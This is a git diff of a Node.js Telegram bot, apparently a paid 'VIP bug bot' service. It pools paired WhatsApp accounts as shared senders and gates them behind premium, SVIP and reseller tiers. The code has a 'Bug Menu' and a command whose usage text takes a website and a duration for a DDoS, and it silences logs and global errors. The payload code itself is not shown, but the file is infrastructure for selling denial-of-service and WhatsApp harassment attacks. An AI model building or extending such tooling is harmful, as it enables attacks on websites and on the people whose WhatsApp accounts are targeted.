@@ -1,4 +1,3 @@
-
 // ==========================================
 // SUPRESSÃO DE LOGS E TRATAMENTO DE ERROS
 // ==========================================
@@ -16,12 +15,11 @@ process.stdout.write = (chunk, encoding, callback) => {
     str.includes("Closing open session") ||
     str.includes("Decrypted message with closed session")
   ) {
-    return true; // Bloqueia a impressão dessa mensagem no terminal
+    return true;
   }
   return originalStdoutWrite(chunk, encoding, callback);
 };
 
-// GARANTE QUE NÃO DÊ ERRO GLOBAL (Filtra reconexões do Baileys/WhatsApp)
 process.setMaxListeners(0);
 process.on('uncaughtException', (err) => {
   const msg = err?.message || String(err);
@@ -38,8 +36,6 @@ process.on('unhandledRejection', (reason) => {
 // ==========================================
 // DEPENDÊNCIAS E CONFIGURAÇÃO
 // ==========================================
-// [PERF] Removed blocking npm install at startup - dependencies are managed via package.json
-// require("child_process").execSync("npm install libsignal @sakataoffc/baileys --allow-git");
 process.env.NTBA_FIX_350 = 1;
 const SY = require('node-telegram-bot-api');
 const fs = require('fs');
@@ -53,7 +49,7 @@ const {
     proto,
     DisconnectReason,
     makeCacheableSignalKeyStore,
-    fetchLatestBaileysVersion, 
+    fetchLatestBaileysVersion,
     groupGetInviteInfo,
     generateWAMessageFromContent
 } = require('@sakataoffc/baileys');
@@ -62,42 +58,26 @@ let phoneNumber = "6288268145069"
 const pairingCode = !!phoneNumber
 const NodeCache = require("node-cache")
 
-// Função de log formatada com cores ANSI e tags claras
 function log(type, category, ...message) {
     const timestamp = new Date().toLocaleTimeString('id-ID');
-    
-    // Se a função for chamada com apenas 1 argumento: log("mensagem")
     if (category === undefined && message.length === 0) {
         console.log(`\x1b[90m[${timestamp}]\x1b[0m ${type}`);
         return;
     }
-
-    // Cores ANSI para o terminal do Pterodactyl
     const colors = {
-        info: '\x1b[36m',     // Ciano
-        success: '\x1b[32m',  // Verde
-        command: '\x1b[35m',  // Magenta/Roxo
-        error: '\x1b[31m',    // Vermelho
-        warn: '\x1b[33m',     // Amarelo
-        system: '\x1b[34m'    // Azul
+        info: '\x1b[36m',
+        success: '\x1b[32m',
+        command: '\x1b[35m',
+        error: '\x1b[31m',
+        warn: '\x1b[33m',
+        system: '\x1b[34m'
     };
-
-    const color = colors[type?.toLowerCase()] || '\x1b[37m'; // Branco padrão
+    const color = colors[type?.toLowerCase()] || '\x1b[37m';
     const tag = `[${type.toUpperCase()}]`.padEnd(9);
     const cat = category ? `[\x1b[1m${category}\x1b[0m]` : '';
     const content = message.join(' ');
-
     console.log(`\x1b[90m[${timestamp}]\x1b[0m ${color}${tag}\x1b[0m ${cat} ${content}`);
 }
-
-
-
-
-// Clear Ok SY Moyna 🥰
-
-// Railway par process ko continuously run karne dein.
-// Scheduled process.exit() remove kiya gaya hai, warna bot 60 minutes baad
-// normal exit ke saath band ho jata tha aur Railway "Run Completed" dikhata tha.
 
 const LoveDir = './Love';
 if (!fs.existsSync(LoveDir)) {
@@ -114,9 +94,7 @@ const LoveLogo = `${config.logo}`
 const waSessions = {};
 const pairingTracker = new Map();
 
-// ===== SVIP & GLOBAL SENDER SYSTEM =====
 function getAuthPath(chatId, number) {
-    // unified: check both old and new locations
     const p1 = `./Love/auth/${chatId}/${number}`;
     const p2 = `./Love/${chatId}/Auths/${number}`;
     if (fs.existsSync(p1)) return p1;
@@ -134,16 +112,16 @@ function getUserTier(uid){
     const db=getDB();
     if(id===config.adminId.toString()) return 4;
     if(db.resellers.includes(id)) return 3;
-    if(db.svip.includes(id)) return 3; // SVIP same as reseller privilege for sender
+    if(db.svip.includes(id)) return 3;
     if(db.premium.includes(id)) return 2;
     return 1;
 }
 function getTierName(t){ return t===4?'Owner':t===3?'Reseller/SVIP':t===2?'Premium':'Free'; }
 function canUseGlobal(uid){
     const tier=getUserTier(uid);
-    if(tier>=3) return true; // SVIP/Reseller/Owner always global
+    if(tier>=3) return true;
     const db=getDB();
-    return db.globalSender === true && tier>=2; // premium can also use global if enabled
+    return db.globalSender === true && tier>=2;
 }
 function getGlobalSenders(){
     const all=[];
@@ -157,13 +135,9 @@ function getGlobalSenders(){
 function getAvailableSenders(chatId, userId){
     const cid=chatId && chatId.toString();
     const uid=userId && userId.toString();
-    // group premium: if chat is group and group has premium/svip -> allow global
     if(cid && (isGroupPremium(cid) || isGroupSvip(cid))) return getGlobalSenders();
-    // user tier check
     if(uid && canUseGlobal(uid)) return getGlobalSenders();
-    // fallback: own senders
     if(cid && waSessions[cid] && waSessions[cid].length>0) return waSessions[cid].map(s=>({...s, ownerChatId:cid}));
-    // SVIP global fallback: if no own but user is svip/reseller, still give global even if empty own
     if(uid && getUserTier(uid)>=3){
         const g=getGlobalSenders();
         if(g.length>0) return g;
@@ -174,7 +148,6 @@ function countAllSenders(){
     let total=0;
     const perOwner={};
     for(const k of Object.keys(waSessions)){ perOwner[k]=(waSessions[k]||[]).length; total+=(waSessions[k]||[]).length; }
-    // also scan filesystem for offline paired numbers (creds.json exists but not yet loaded)
     try{
         const bases=['./Love/auth','./Love'];
         for(const base of bases){
@@ -183,13 +156,11 @@ function countAllSenders(){
             for(const e of entries){
                 const p=path.join(base,e);
                 if(!fs.statSync(p).isDirectory()) continue;
-                // if base is ./Love/auth then e is chatId, check subdirs
                 if(base==='./Love/auth'){
                     try{
                         const nums=fs.readdirSync(p);
                         for(const n of nums){
                             if(fs.existsSync(path.join(p,n,'creds.json'))){
-                                // check if already counted in waSessions
                                 const already=(waSessions[e]||[]).some(s=>s.num===n);
                                 if(!already) total++;
                             }
@@ -226,7 +197,6 @@ function cleanExpired(){
     }catch(e){ log('error','EXPIRY',e.message); }
 }
 setInterval(cleanExpired, 60*1000);
-// initial clean after 5s
 setTimeout(cleanExpired, 5000);
 
 const SYLovesButton = {
@@ -236,7 +206,7 @@ const SYLovesButton = {
                 text: '📢 Join Channel',
                 url: config.channel,
                 icon_custom_emoji_id: "5370599459661045441"
-            }], 
+            }],
             [{ text: '👥 Join Group', url: config.group, icon_custom_emoji_id: "5443038326535759644"  }],
             [{
                 text: 'Check Membership',
@@ -260,7 +230,6 @@ async function CheckSYlovesToo(botInstance, userId, chId, grId, adminId) {
         let inChannel = true;
         let inGroup = true;
         const validStatuses = ['creator', 'administrator', 'member', 'restricted'];
-        // Run both checks in parallel for speed
         const promises = [];
         if (chId) promises.push(botInstance.getChatMember(chId, userId).then(m => validStatuses.includes(m.status)).catch(() => true));
         else promises.push(Promise.resolve(true));
@@ -277,13 +246,6 @@ async function CheckSYlovesToo(botInstance, userId, chId, grId, adminId) {
         return true;
     }
 }
-
-
-
-
-
-// SY Loves Here 🤗❤️‍🩹
-
 
 const SYLoves = `./SY/S7/`
 
@@ -413,7 +375,7 @@ const saveDB = (data) => {
 };
 
 function sendSYLove(bot, chatId) {
-    const priceText = 
+    const priceText =
         `╭━━━〔 🚫 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n\n` +
         `❌ You are not authorized to use this command.\n\n` +
         `📩 Please contact the developer to buy: @shahzu_404\n\n` +
@@ -437,7 +399,6 @@ function LoveGlobalState(userId, chatId=null) {
     if (db.resellers.includes(uid)) return true;
     if (db.premium.includes(uid)) return true;
     if (db.svip.includes(uid)) return true;
-    // group premium: if command in premium group, allow
     if(chatId && (db.groupPremium[chatId.toString()] || db.groupSvip[chatId.toString()])) return true;
     return false;
 }
@@ -448,7 +409,6 @@ function hasAccess(uid, chatId, minTier=2){
 function getStyle(){ return 'primary'; }
 function Lovesbutton(user) {
   const style = getStyle(user);
-
   return {
     reply_markup: {
       inline_keyboard: [
@@ -493,9 +453,7 @@ async function SYLoveMeOk(sock) {
     } catch (err) {}
 }
 
-
 async function StartLovingSY(chatId, number, S7, isreconnect = false, ownerId = null) {
-    //const authPath = `./Love/auth/${chatId}/${number}`;
     let authPath;
     if (ownerId) {
         authPath = `./Love/${ownerId}/Auths/${number}`;
@@ -624,22 +582,7 @@ async function StartLovingSY(chatId, number, S7, isreconnect = false, ownerId = 
     });
 }
 
-
-
 async function AutoLovingWithSY(S7) {
-    const bases = ['./Love/auth'];
-    // also scan legacy per-owner paths: ./Love/<ownerId>/Auths/<number>
-    try{
-        if(fs.existsSync('./Love')){
-            const maybeOwners=fs.readdirSync('./Love');
-            for(const mo of maybeOwners){
-                const p=path.join('./Love', mo, 'Auths');
-                if(fs.existsSync(p) && fs.statSync(p).isDirectory()) bases.push(p.replace('./Love/','./Love/').replace('/Auths',''));
-                // Actually push Owner base for scanning differently
-            }
-        }
-    }catch{}
-    // scan standard auth
     for(const SYBase of ['./Love/auth']){
         if (!fs.existsSync(SYBase)) continue;
         try {
@@ -661,7 +604,6 @@ async function AutoLovingWithSY(S7) {
             log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
         }
     }
-    // scan per-owner Auths
     try{
         if(fs.existsSync('./Love')){
             const entries=fs.readdirSync('./Love');
@@ -682,9 +624,6 @@ async function AutoLovingWithSY(S7) {
         }
     }catch(e){ log('error','SYSTEM','Legacy AutoReconnect: '+e.message); }
 }
-
-
-
 
 async function S7Naverdead(token, errorMsg) {
     let db = getDB();
@@ -828,10 +767,6 @@ function startSYloveBot(token) {
                             url: botConfig.group,
                             icon_custom_emoji_id: "5443038326535759644"
                         }],
-                        /*[{
-                            text: '📱 Follow WhatsApp',
-                            url: config.waChannel || 'https://whatsapp.com'
-                        }],*/
                         [{
                             text: 'Check Membership',
                             callback_data: 'check_membership',
@@ -842,74 +777,72 @@ function startSYloveBot(token) {
             };
         }
 
-if (token === config.mainToken) {
-    SABIR7718 = {
-        reply_markup: {
-            inline_keyboard: [
-                [{
-                    text: 'I| Bug Menu',
-                    callback_data: 'bug_menu',
-                    style : "primary",
-                    icon_custom_emoji_id: "5373290243787070962"
-                }, {
-                    text: 'I| Misc Menu',
-                    callback_data: 'misc_menu',
-                    style : "success",
-                    icon_custom_emoji_id: "6032742198179532882"
-                }],
-                [{
-                    text: 'I| Channel ↗',
-                    url: `${config.channel}`,
-                    style : "primary",
-                    icon_custom_emoji_id: "5370599459661045441"
-                }],
-                [{
-                    text: 'I| Group ↗',
-                    url: `${config.group}`,
-                    style : "danger",
-                    icon_custom_emoji_id: "5443038326535759644"
-                }],
-            ]
+        if (token === config.mainToken) {
+            SABIR7718 = {
+                reply_markup: {
+                    inline_keyboard: [
+                        [{
+                            text: 'I| Bug Menu',
+                            callback_data: 'bug_menu',
+                            style : "primary",
+                            icon_custom_emoji_id: "5373290243787070962"
+                        }, {
+                            text: 'I| Misc Menu',
+                            callback_data: 'misc_menu',
+                            style : "success",
+                            icon_custom_emoji_id: "6032742198179532882"
+                        }],
+                        [{
+                            text: 'I| Channel ↗',
+                            url: `${config.channel}`,
+                            style : "primary",
+                            icon_custom_emoji_id: "5370599459661045441"
+                        }],
+                        [{
+                            text: 'I| Group ↗',
+                            url: `${config.group}`,
+                            style : "danger",
+                            icon_custom_emoji_id: "5443038326535759644"
+                        }],
+                    ]
+                }
+            };
+        } else {
+            SABIR7718 = {
+                reply_markup: {
+                    inline_keyboard: [
+                        [{
+                            text: 'I| Bug Menu',
+                            callback_data: 'bug_menu',
+                            style : "primary",
+                            icon_custom_emoji_id: "5373290243787070962"
+                        }, {
+                            text: 'I| Misc y',
+                            callback_data: 'misc_menu',
+                            style : "success",
+                            icon_custom_emoji_id: "6032742198179532882"
+                        }],
+                        [{
+                            text: 'I| Channel ↗',
+                            url: `${config.channel}`,
+                            style: "primary",
+                            icon_custom_emoji_id: "5370599459661045441"
+                        }],
+                        [{
+                            text: 'I| Group ↗',
+                            url: `${config.group}`,
+                            style : "danger",
+                            icon_custom_emoji_id: "5443038326535759644"
+                        }],
+                    ]
+                }
+            };
         }
-    };
-} else {
-    SABIR7718 = {
-        reply_markup: {
-            inline_keyboard: [
-                [{
-                    text: 'I| Bug Menu',
-                    callback_data: 'bug_menu',
-                    style : "primary",
-                    icon_custom_emoji_id: "5373290243787070962"
-                }, {
-                    text: 'I| Misc y',
-                    callback_data: 'misc_menu',
-                    style : "success",
-                    icon_custom_emoji_id: "6032742198179532882"
-                }],
-                [{
-                    text: 'I| Channel ↗',
-                    url: `${config.channel}`,
-                    style: "primary",
-                    icon_custom_emoji_id: "5370599459661045441"
-                }],
-                [{
-                    text: 'I| Group ↗',
-                    url: `${config.group}`,
-                    style : "danger",
-                    icon_custom_emoji_id: "5443038326535759644"
-                }],
-            ]
-        }
-    };
-}
 
-        // [PERF] Optimized single handler with command map and cached user tracking
         const commandMap = new Map();
         const userSeenCache = new Set();
         let userFileCache = null;
         let userFileCacheTime = 0;
-        // Load user cache once
         try {
             const uf = path.join(LoveDir,'user.json');
             if (fs.existsSync(uf)) {
@@ -922,7 +855,6 @@ if (token === config.mainToken) {
                 }
             }
         } catch {}
-        // Single message handler for all commands - FAST
         S7.on('message', async (msg) => {
             if (!msg.text) return;
             let raw = msg.text.trim().split(' ')[0];
@@ -932,11 +864,9 @@ if (token === config.mainToken) {
             if (!callback) return;
             const chatId = msg.chat.id;
             const userId = msg.from.id;
-            // [PERF] Fast user tracking with in-memory cache + async write
             const userKey = String(userId);
             if (!userSeenCache.has(userKey)) {
                 userSeenCache.add(userKey);
-                // Async debounced write to avoid blocking
                 setImmediate(() => {
                     try {
                         const uf = path.join(LoveDir,'user.json');
@@ -958,7 +888,6 @@ if (token === config.mainToken) {
             }
             try {
                 const name = msg.from.first_name || "Unknown";
-                // [PERF] Non-blocking log
                 setImmediate(() => log('command', name, `${msg.text} [chat:${chatId} tier:${GetSYLoVe(userId)}]`));
                 await callback(msg);
             } catch (err) {
@@ -973,7 +902,6 @@ if (token === config.mainToken) {
             }
         }
 
-
 SYLoVe(['start', 'menu'], async (msg) => {
     const chatId = msg.chat.id;
     const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
@@ -986,10 +914,9 @@ SYLoVe(['start', 'menu'], async (msg) => {
         'CAACAgUAAxkBAAEhJBdqbV5tQEackJRmNQnQys2TP8fljwACkRYAAvDBAVYExm1e84EYcz0E'
     );
 
-                setTimeout(async () => {
-            await S7.deleteMessage(chatId, sticker.message_id).catch(() => {});
-
-            const captionText = `<b>✨ S H A H Z U -  V I P B O T</b>
+    setTimeout(async () => {
+        await S7.deleteMessage(chatId, sticker.message_id).catch(() => {});
+        const captionText = `<b>✨ S H A H Z U -  V I P B O T</b>
 
 <b>✨ Developer :</b> ${botConfig.ownerContact} 🤍
 <b>✨ System :</b> ${status} ☠
@@ -997,25 +924,24 @@ SYLoVe(['start', 'menu'], async (msg) => {
 <b>✨ Online :</b> ${uptime} ✨
 
 <b>👑 Click The Buttons Bellow</b>`;
-
-            S7.sendPhoto(chatId, botConfig.logo, {
-                caption: captionText,
+        S7.sendPhoto(chatId, botConfig.logo, {
+            caption: captionText,
+            parse_mode: 'HTML',
+            ...SABIR7718
+        }).catch(() => {
+            S7.sendMessage(chatId, captionText, {
                 parse_mode: 'HTML',
                 ...SABIR7718
-            }).catch(() => {
-                S7.sendMessage(chatId, captionText, {
-                    parse_mode: 'HTML',
-                    ...SABIR7718
-                });
             });
-        }, 1000);
-    });
-  
+        });
+    }, 1000);
+});
+
         SYLoVe('setbot', async (msg) => {
             const chatId = msg.chat.id.toString();
             if (tokenData && tokenData.owner !== chatId) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You are not the owner of this bot.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -1072,7 +998,7 @@ SYLoVe(['start', 'menu'], async (msg) => {
             } else if (type === 'channelid') db.tokens[tIndex].config.channelId = value;
             else if (type === 'groupid') db.tokens[tIndex].config.groupId = value;
             else return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid type. Check the menu for options.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
 
             saveDB(db);
@@ -1091,9 +1017,6 @@ SYLoVe(['start', 'menu'], async (msg) => {
             startSYloveBot(token);
         });
 
-
-
-
         SYLoVe('delbot', async (msg) => {
             const chatId = msg.chat.id.toString();
             let db = getDB();
@@ -1102,7 +1025,7 @@ SYLoVe(['start', 'menu'], async (msg) => {
 
             if (!botData) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You do not have a hosted bot.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -1123,10 +1046,9 @@ SYLoVe(['start', 'menu'], async (msg) => {
             }
 
             S7.sendMessage(chatId, '<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Your bot has been deleted and sessions removed.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
         });
-
 
         SYLoVe('addbot', async (msg) => {
             const chatId = msg.chat.id.toString();
@@ -1134,14 +1056,14 @@ SYLoVe(['start', 'menu'], async (msg) => {
             const newToken = args[1];
 
             if (!newToken) return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Usage: /addbot <TOKEN>', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
 
             let db = getDB();
             const userBots = db.tokens.filter(t => t.owner === chatId);
             if (userBots.length >= 1) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You can only host 1 bot.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -1176,20 +1098,17 @@ SYLoVe(['start', 'menu'], async (msg) => {
 
             } catch (e) {
                 S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid Token or Bot already active.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
         });
-        
+
 SYLoVe('groupid', async (msg) => {
     const chatId = msg.chat.id.toString();
     const userId = msg.from.id.toString();
 
     let db = getDB();
 
-    // Free users allowed - no premium restriction for groupid
-
-    // 1. Parsing args di paling atas
     const args = msg.text.trim().split(/\s+/);
     const groupLink = args[1];
 
@@ -1209,7 +1128,6 @@ SYLoVe('groupid', async (msg) => {
         );
     }
 
-    // 2. Check WhatsApp sessions - free users can also use global senders for groupid
     let sessions = getAvailableSenders(chatId, userId);
     if (!sessions || sessions.length === 0) sessions = getGlobalSenders();
     if (!sessions || sessions.length === 0) {
@@ -1269,7 +1187,7 @@ SYLoVe('groupid', async (msg) => {
                 return S7.sendMessage(
                     chatId,
                     '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Usage:\n/xxddos <web> <time>\n\nExample:\n/ddos https://example.com 60', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
             const target = args[0];
@@ -1292,7 +1210,6 @@ SYLoVe('groupid', async (msg) => {
 
         });
 
-
         SYLoVe('checkmembership', async (msg) => {
             const chatId = msg.chat.id;
             const userId = msg.from.id;
@@ -1311,7 +1228,6 @@ SYLoVe('groupid', async (msg) => {
             }
         });
 
-
         SYLoVe('addtoken', async (msg) => {
             const chatId = msg.chat.id.toString();
             const userId = msg.from.id.toString();
@@ -1325,7 +1241,7 @@ SYLoVe('groupid', async (msg) => {
             let db = getDB();
             if (db.tokens.find(t => t.token === newToken)) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Token already connected.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
             const myBotsCount = db.tokens.filter(t => t.owner === userId).length;
@@ -1349,12 +1265,12 @@ SYLoVe('groupid', async (msg) => {
                 saveDB(db);
                 startSYloveBot(newToken);
                 S7.sendMessage(chatId,
-                    `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`, { 
-                     parse_mode: 'HTML' 
+                    `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`, {
+                     parse_mode: 'HTML'
                 });
             } catch (e) {
                 S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Invalid token.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
         });
@@ -1369,7 +1285,7 @@ SYLoVe('groupid', async (msg) => {
 
             if (!number) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Provide a phone number.\nExample: /reqpair +919876543210', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -1400,21 +1316,17 @@ SYLoVe('groupid', async (msg) => {
             }
 
             const cleanNumber = number.replace(/[^0-9]/g, '');
-            // check both possible paths
             const paths = [
                 `./Love/auth/${chatId}/${cleanNumber}`,
                 `./Love/${chatId}/Auths/${cleanNumber}`
             ];
-            // also search global for that number if user is owner/admin/svip trying to delete any
             let found=false;
             for(const p of paths){
                 if (fs.existsSync(p)) {
                     try { fs.rmSync(p, { recursive: true, force: true }); found=true; } catch(err){ return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> Failed: ${err.message}`, {parse_mode:'HTML'}); }
                 }
             }
-            // also remove from waSessions memory
             if(waSessions[chatId]) waSessions[chatId]=waSessions[chatId].filter(s=>s.num!==cleanNumber);
-            // if SVIP/admin, also search global sessions
             if(!found && (getUserTier(userId)>=3 || isGroupSvip(chatId))){
                 for(const oc of Object.keys(waSessions)){
                     const idx=waSessions[oc].findIndex(s=>s.num===cleanNumber);
@@ -1437,17 +1349,14 @@ SYLoVe('groupid', async (msg) => {
             if(!LoveGlobalState(userId,chatId)) return sendSYLove(S7,chatId);
             const args=msg.text.trim().split(/\s+/);
             if(args[1]==='all'){
-                // owner only
                 if(userId!==config.adminId && chatId!==config.adminId) return S7.sendMessage(chatId, notauthorized);
                 let count=0;
                 for(const oc of Object.keys(waSessions)){ count+=waSessions[oc].length; waSessions[oc]=[]; }
-                // delete filesystem?
                 try{ if(fs.existsSync('./Love/auth')) fs.rmSync('./Love/auth',{recursive:true,force:true}); fs.mkdirSync('./Love/auth',{recursive:true}); }catch{}
                 return S7.sendMessage(chatId, `🗑️ All senders cleared (${count} sessions).`, {parse_mode:'HTML'});
             }
             return S7.sendMessage(chatId, 'Usage: /delsender all — delete all senders (admin only) or /delpair <number>');
         });
-
 
         SYLoVe('deltoken', async (msg) => {
             const chatId = msg.chat.id.toString();
@@ -1466,7 +1375,7 @@ SYLoVe('groupid', async (msg) => {
 
             if (!tokenObj || tokenObj.owner !== userId) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> No connected token found.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -1479,8 +1388,8 @@ SYLoVe('groupid', async (msg) => {
             }
             log('info', `Token deleted: ${delToken.substring(0, 10)}...`);
             S7.sendMessage(chatId, '<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Token deleted successfully.', {
-            parse_mode: 'HTML'            
-            }); 
+            parse_mode: 'HTML'
+            });
         });
 
         SYLoVe('mytoken', async (msg) => {
@@ -1495,7 +1404,7 @@ SYLoVe('groupid', async (msg) => {
 
             if (myTokens.length === 0) {
                 return S7.sendMessage(chatId, '<tg-emoji emoji-id="5974083768233760323">✖️</tg-emoji> You have not added any tokens.', {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
             }
 
@@ -1547,7 +1456,7 @@ SYLoVe('groupid', async (msg) => {
             db.resellers.push(targetId);
             saveDB(db);
             S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ID ${targetId} added as Reseller.`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
         });
 
@@ -1568,7 +1477,7 @@ SYLoVe('groupid', async (msg) => {
             db.resellers = db.resellers.filter(id => id !== targetId);
             saveDB(db);
             S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ID ${targetId} removed from Resellers.`, {
-            parse_mode: 'HTML'            
+            parse_mode: 'HTML'
             });
         });
 
@@ -1628,7 +1537,6 @@ SYLoVe('groupid', async (msg) => {
         );
     }
 
-    // Duration format: 30d, 7d, 1d, etc.
     const match = duration.match(/^(\d+)d$/i);
 
     if (!match) {
@@ -1695,7 +1603,7 @@ SYLoVe('groupid', async (msg) => {
             saveDB(db);
             S7.sendMessage(chatId, `🗑️ ID ${targetId} removed from Premium.`);
       });
-// ===== SVIP SYSTEM =====
+
         SYLoVe('addsvip', (msg) => {
             const chatId = msg.chat.id.toString();
             const userId = msg.from.id.toString();
@@ -1715,7 +1623,6 @@ SYLoVe('groupid', async (msg) => {
             const expiredAt = Date.now() + (days * 24 * 60 * 60 * 1000);
             db.svip.push(targetId);
             db.svipExpiry[targetId]=expiredAt;
-            // SVIP automatically gets premium if not already
             if (!db.premium.includes(targetId)) { db.premium.push(targetId); if(!db.premiumExpiry) db.premiumExpiry={}; db.premiumExpiry[targetId]=expiredAt; }
             saveDB(db);
             const expiredDate = new Date(expiredAt).toLocaleString('en-US', { timeZone: 'Asia/Jakarta', dateStyle:'long', timeStyle:'short'});
@@ -1751,6 +1658,7 @@ SYLoVe('groupid', async (msg) => {
             text+='\n──────────────────';
             S7.sendMessage(chatId, text, {parse_mode:'HTML'});
         });
+
         SYLoVe(['listsender','listsenders','senderlist'], async (msg) => {
             const chatId = msg.chat.id.toString();
             const userId = msg.from.id.toString();
@@ -1761,8 +1669,7 @@ SYLoVe('groupid', async (msg) => {
             const tier = getUserTier(userId);
             const isGlobal = canUseGlobal(userId) || isGroupPremium(chatId) || isGroupSvip(chatId);
             const totalInfo = countAllSenders();
-            let text = `<blockquote><b>📱 Sender Status</b></blockquote>`;
-            text += `<blockquote>`;
+            let text = `<b>📱 Sender Status</b>\n`;
             text += `<b>👤 Tier:</b> ${GetSYLoVe(userId)} (${getTierName(tier)})\n`;
             text += `<b>🔐 Global:</b> ${isGlobal?'YES ✅':'NO ❌'}\n`;
             text += `━━━━━━━━━━━━━━\n`;
@@ -1770,24 +1677,20 @@ SYLoVe('groupid', async (msg) => {
             text += `• Own: <b>${own.length}</b>\n`;
             text += `• Global Pool: <b>${allGlobal.length}</b>\n`;
             text += `• Available: <b>${avail.length}</b>\n`;
-            text += `• Total Paired: <b>${totalInfo.total}</b>`;
-            text += `</blockquote>`;
+            text += `• Total Paired: <b>${totalInfo.total}</b>\n`;
             if(avail.length===0){
-                text += `<blockquote>`;
-                text += `❌ <b>No sender available</b>\n`;
+                text += `\n❌ <b>No sender available</b>\n`;
                 if(tier>=3 || isGlobal) text+= `Global pool empty — ask member to /reqpair.`;
                 else text+= `Use /reqpair 62xxxx to pair.\nSVIP = auto global.`;
-                text += `</blockquote>`;
             } else {
-                text += `<blockquote><b>Available Senders</b>\n`;
+                text += `\n<b>Available Senders</b>\n`;
                 avail.slice(0,15).forEach((s,i)=>{
                     const owner = s.ownerChatId===chatId ? 'You' : s.ownerChatId.substring(0,6)+'…';
                     const st = s.sock ? '🟢' : '🟡';
                     text+= `${i+1}. ${st} <code>${s.num}</code> (${owner})\n`;
                 });
                 if(avail.length>15) text+= `… +${avail.length-15} more\n`;
-                text += `</blockquote>`;
-                if(!isGlobal) text+= `<blockquote><i>💡 Tip: SVIP unlocks all Global Senders without pairing!</i></blockquote>`;
+                if(!isGlobal) text+= `\n<i>💡 Tip: SVIP unlocks all Global Senders without pairing!</i>\n`;
             }
             try{
                 const offline=[];
@@ -1808,16 +1711,15 @@ SYLoVe('groupid', async (msg) => {
                     }
                 }
                 if(offline.length>0){
-                    text+= `<blockquote><b>Offline (${offline.length})</b>\n`;
+                    text+= `\n<b>Offline (${offline.length})</b>\n`;
                     offline.slice(0,8).forEach((o,i)=>{ text+= `${i+1}. <code>${o.num}</code>\n`; });
                     if(offline.length>8) text+= `… +${offline.length-8} more\n`;
-                    text+= `</blockquote>`;
                 }
             }catch{}
             S7.sendMessage(chatId, text, {parse_mode:'HTML'});
         });
-// ===== GROUP PREMIUM / SVIP =====
-        SYLoVe(['addgprem','addgroupprem','addpremiumgroup'], (msg)=>{
+
+          SYLoVe(['addgprem','addgroupprem','addpremiumgroup'], (msg)=>{
             const chatId=msg.chat.id.toString();
             const userId=msg.from.id.toString();
             let db=getDB();
@@ -1908,7 +1810,6 @@ SYLoVe('groupid', async (msg) => {
             }
             S7.sendMessage(chatId, text, {parse_mode:'HTML'});
         });
-        // ===== UTILITY: ID & ACCESS CHECK =====
         SYLoVe(['id','myid','cekid','groupid2'], async (msg)=>{
             const chatId=msg.chat.id.toString();
             const userId=msg.from.id.toString();
@@ -1968,66 +1869,65 @@ SYLoVe('groupid', async (msg) => {
         SYLoVe(['help','bantuan','commands'], async (msg)=>{
             const chatId=msg.chat.id.toString();
             const uptime=getRuntime();
-            const txt=`<blockquote><b>📚 SHAHZU-VIP-BUG — HELP</b></blockquote>
-<blockquote><b>🆔 Utility</b>
+            const txt=`<b>📚 SHAHZU-VIP-BUG — HELP</b>
+
+<b>🆔 Utility</b>
 /id — check IDs
 /myaccess — your tier & expiry
 /listsender — sender counts
 /listgc — your groups
 /groupid — get WA group ID
-</blockquote>
-<blockquote><b>⭐ Premium/SVIP</b>
+
+<b>⭐ Premium/SVIP</b>
 /addprem ID 30d — add premium
 /delprem ID
 /listprem
-/addsvip ID 30d — <b>SVIP (Global Sender)</b>
+/addsvip ID 30d — SVIP (Global Sender)
 /delsvip ID
 /listsvip
-</blockquote>
-<blockquote><b>🏆 Group Premium</b>
+
+<b>🏆 Group Premium</b>
 /addgprem groupId 30d
 /delgprem groupId
 /addgsvip groupId 30d
 /delgsvip groupId
 /listgprem
-</blockquote>
-<blockquote><b>📱 Sender</b>
+
